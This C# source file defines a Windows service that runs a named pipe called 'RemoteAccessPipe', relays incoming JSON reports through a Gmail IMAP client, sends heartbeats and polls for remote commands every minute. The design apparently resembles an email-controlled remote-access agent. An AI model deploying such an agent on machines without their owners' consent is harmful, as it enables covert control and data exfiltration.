using System;
using System.IO;
using System.IO.Pipes;
using System.ServiceProcess;
using System.Threading;

namespace WinSvc;

public partial class Service1 : ServiceBase
{
    private Thread _pipeThread;
    private volatile bool _running;
    private Timer _commandTimer;
    private Timer _heartbeatTimer;
    private ServiceImpl _serviceImpl;
    private ImapGmailClient _imapClient;

    public Service1()
    {
        InitializeComponent();
    }

    protected override void OnStart(string[] args) => StartService();
    protected override void OnStop() => StopService();

    public void DebugStart(string[] args) => StartService();
    public void DebugStop() => StopService();

    private void StartService()
    {
        try
        {
            _imapClient = new ImapGmailClient();
            _imapClient.Initialize();

            _running = true;
            _pipeThread = new Thread(ListenForExtendedInfo) { IsBackground = true };
            _pipeThread.Start();

            _serviceImpl = new ServiceImpl();

            _commandTimer = new Timer(
                _ => ProcessCommands(), null, 10000, 60000);

            _heartbeatTimer = new Timer(
                _ => SafeHeartbeat(), null, 0, 60000);

            Log("Service started");
        }
        catch (Exception ex)
        {
            Log($"Start failed: {ex.Message}");
            throw;
        }
    }

    private void StopService()
    {
        _running = false;
        _commandTimer?.Dispose();
        _heartbeatTimer?.Dispose();
        _pipeThread?.Join(5000);
        Log("Service stopped");
    }

    private void ListenForExtendedInfo()
    {
        while (_running)
        {
            try
            {
                using (var server = new NamedPipeServerStream(
                    "RemoteAccessPipe",
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Byte,
                    PipeOptions.Asynchronous))
                {
                    server.WaitForConnection();

                    var reader = new StreamReader(server);
                    var writer = new StreamWriter(server) { AutoFlush = true };

                    var request = reader.ReadLine();
                    if (request == "GET_EXTENDED_INFO")
                    {
                        writer.WriteLine("OK");
                        var json = reader.ReadToEnd();

                        if (!string.IsNullOrWhiteSpace(json))
                        {
                            _imapClient.SendExtendedReport(json);
                            writer.WriteLine("SENT");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Pipe error: {ex.Message}");
                Thread.Sleep(1000);
            }
        }
    }

    private void ProcessCommands()
    {
        try
        {
            _serviceImpl.ProcessCommands();
        }
        catch (Exception ex)
        {
            Log($"Command error: {ex.Message}");
        }
    }

    private void SafeHeartbeat()
    {
        try
        {
            _imapClient.UpdateHeartbeat();
        }
        catch (Exception ex)
        {
            Log($"Heartbeat error: {ex.Message}");
        }
    }

    private void Log(string message)
    {
#if DEBUG
        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
#else
        EventLog.WriteEntry("RemoteAccessService", message, EventLogEntryType.Information);
#endif
    }
}
